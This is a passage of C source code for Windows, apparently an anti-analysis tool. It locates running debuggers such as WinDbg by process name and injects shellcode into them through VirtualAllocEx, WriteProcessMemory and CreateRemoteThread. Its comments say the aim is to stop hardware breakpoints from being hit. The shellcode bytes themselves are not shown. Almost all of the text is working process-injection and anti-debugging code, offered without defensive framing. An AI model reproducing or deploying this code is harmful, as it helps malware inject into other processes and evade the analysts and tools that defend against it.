		Status = InjectDebugger(PIDx32);
		if (Status == -1) {
			printf("injection failed\n");
		}
		else {
			printf("injection succeed\n");
		}
	}

	if (PIDwindbg) {
		printf("Found windbg debugger\n");
		printf("injecting the shellcode\n");
		Status = InjectDebugger(PIDwindbg);
		if (Status == -1) {
			printf("injection failed\n");
		}
		else {
			printf("injection succeed\n");
		}
	}


	//Do Work Here, if put HW break point of Sleep it will not get hit
	while (true)
	{
		printf("Anti-Analysis, Put HW Break Point here for test\n");
		Sleep(1000);
	}

	return 0;
}


DWORD GetPIDfromProcessName(const WCHAR* ProcessName)
{
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE)
	{
		return 0;
	}
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);
	//CHAR processName = L"";
	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);
		return 0;
	}
	do
	{
		if (wcscmp(ProcessName, pe32.szExeFile) == 0)
		{
			CloseHandle(hProcessSnap);
			return pe32.th32ProcessID;
			break;
		}
	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
	return 0;
}

DWORD InjectDebugger(DWORD PID) {

	LPVOID BaseAddress = NULL;
	DWORD Status = NULL;
	HANDLE hThread = NULL;

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (!hProcess) {
		printf("Failed to Open handle to process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	printf("%d\n", sizeof(ShellCode));
	BaseAddress = VirtualAllocEx(hProcess, BaseAddress, sizeof(ShellCode) + 20, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!BaseAddress) {
		printf("Failed to Allocate Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}
	printf("%p\n", BaseAddress);
	Status = WriteProcessMemory(hProcess, BaseAddress, ShellCode, sizeof(ShellCode), NULL);
	if (!Status) {
		printf("Failed to Write to Memory in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	hThread = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)BaseAddress, BaseAddress, NULL, NULL);
	if (!hThread) {
		printf("Failed to Create Remote Thread in process PID %d  Error Code is0x%x\n", PID, GetLastError());
		return -1;
	}

	Sleep(4000);
	return 0;
}